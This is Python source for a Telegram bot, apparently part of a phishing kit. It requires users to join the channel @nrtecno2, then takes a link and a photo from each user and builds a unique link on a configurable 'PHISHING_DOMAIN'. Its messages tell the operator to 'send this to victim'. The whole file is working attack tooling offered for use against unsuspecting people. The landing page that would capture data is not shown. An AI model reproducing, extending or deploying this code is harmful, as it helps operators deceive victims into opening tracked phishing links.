import os
import sqlite3
import hashlib
import time
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# ========== CONFIG ==========
BOT_TOKEN = os.environ.get('BOT_TOKEN')
ADMIN_ID = int(os.environ.get('ADMIN_ID', 0))
PHISHING_DOMAIN = os.environ.get('PHISHING_DOMAIN', 'https://your-server.onrender.com')
CHANNEL_USERNAME = '@nrtecno2'

# ========== DATABASE ==========
conn = sqlite3.connect('shared/database.db', check_same_thread=False)
c = conn.cursor()
c.execute('''CREATE TABLE IF NOT EXISTS users
             (user_id INTEGER PRIMARY KEY, username TEXT, link TEXT, photo_id TEXT, unique_code TEXT)''')
conn.commit()

# ========== BOT ==========
bot = telebot.TeleBot(BOT_TOKEN)

# ========== FUNCTIONS ==========
def check_subscription(user_id):
    try:
        member = bot.get_chat_member(chat_id=CHANNEL_USERNAME, user_id=user_id)
        return member.status in ['member', 'administrator', 'creator']
    except:
        return False

def generate_unique_link(user_id):
    raw = f"{user_id}_{time.time()}"
    return hashlib.md5(raw.encode()).hexdigest()[:10]

# ========== HANDLERS ==========
@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.from_user.id
    is_subscribed = check_subscription(user_id)
    
    if not is_subscribed:
        keyboard = InlineKeyboardMarkup(row_width=1)
        keyboard.add(
            InlineKeyboardButton("📢 Join Channel", url="https://t.me/nrtecno2"),
            InlineKeyboardButton("✅ Verify", callback_data="verify_sub")
        )
        bot.reply_to(
            message,
            "⚠️ *Access Denied!*\n\nYou must join @nrtecno2 first.",
            reply_markup=keyboard,
            parse_mode="Markdown"
        )
    else:
        bot.reply_to(message, "✅ *Verified!*\n\nSend me the **link** you want to share.", parse_mode="Markdown")
        c.execute("INSERT OR REPLACE INTO users (user_id, username) VALUES (?, ?)",
                  (user_id, message.from_user.username or 'Unknown'))
        conn.commit()

@bot.callback_query_handler(func=lambda call: call.data == "verify_sub")
def verify(call):
    user_id = call.from_user.id
    is_subscribed = check_subscription(user_id)
    
    if is_subscribed:
        bot.edit_message_text(
            "✅ *Verified!*\n\nNow send me the **link** you want to share.",
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            parse_mode="Markdown"
        )
        c.execute("INSERT OR REPLACE INTO users (user_id) VALUES (?)", (user_id,))
        conn.commit()
    else:
        bot.answer_callback_query(call.id, "❌ You haven't joined yet!", show_alert=True)

@bot.message_handler(func=lambda msg: msg.text and msg.text.startswith('http'))
def handle_link(message):
    user_id = message.from_user.id
    link = message.text
    c.execute("UPDATE users SET link = ? WHERE user_id = ?", (link, user_id))
    conn.commit()
    bot.reply_to(message, "📸 *Photo Required!*\n\nNow send a **photo** to show victim.", parse_mode="Markdown")

@bot.message_handler(content_types=['photo'])
def handle_photo(message):
    user_id = message.from_user.id
    photo_id = message.photo[-1].file_id
    unique_code = generate_unique_link(user_id)
    
    c.execute("UPDATE users SET photo_id = ?, unique_code = ? WHERE user_id = ?",
              (photo_id, unique_code, user_id))
    conn.commit()
    
    phishing_link = f"{PHISHING_DOMAIN}/{unique_code}"
    bot.reply_to(
        message,
        f"✅ *Link Generated!*\n\n🔗 `{phishing_link}`\n\nSend this to victim.",
        parse_mode="Markdown"
    )

# ========== RUN ==========
if not BOT_TOKEN:
    print("❌ BOT_TOKEN not set! Add environment variable in Render.")
else:
    print("✅ Bot is running!")
    bot.infinity_polling()
